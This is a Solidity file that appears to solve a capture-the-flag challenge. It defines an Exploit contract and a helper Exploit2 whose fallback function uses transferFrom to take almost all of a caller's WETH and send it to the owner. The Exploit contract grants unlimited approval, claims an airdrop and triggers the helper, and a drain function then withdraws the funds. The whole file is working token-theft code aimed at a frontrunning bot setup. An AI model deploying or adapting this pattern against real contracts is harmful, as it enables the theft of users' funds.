// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Exploit2 {
    address public owner;
    IWETH public weth;

    constructor(IWETH _weth) {
        weth = _weth;
        owner = msg.sender;
    }

    fallback() external payable {
        if (msg.sender != owner) {
            weth.transferFrom(
                msg.sender,
                owner,
                weth.balanceOf(msg.sender) - 1 ether
            );
        }
    }
}

contract Exploit {
    Challenge public chal;
    IWETH public weth;
    FrontrunBot public bot;
    AirdropDistributor public airdropDistributor;
    address public owner;
    Exploit2 public exploit2;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _chal) {
        chal = Challenge(_chal);
        weth = chal.weth();
        bot = chal.bot();
        airdropDistributor = chal.airdropDistributor();
        owner = msg.sender;
    }

    function create() public {
        exploit2 = new Exploit2(weth);
    }

    function trick() public {
        weth.approve(address(exploit2), type(uint256).max);
        chal.claim("m3f80");
        address(exploit2).call("");
        weth.transfer(owner, 1 ether);
    }

    function drain() public onlyOwner {
        weth.transfer(owner, weth.balanceOf(address(this)));
    }
}
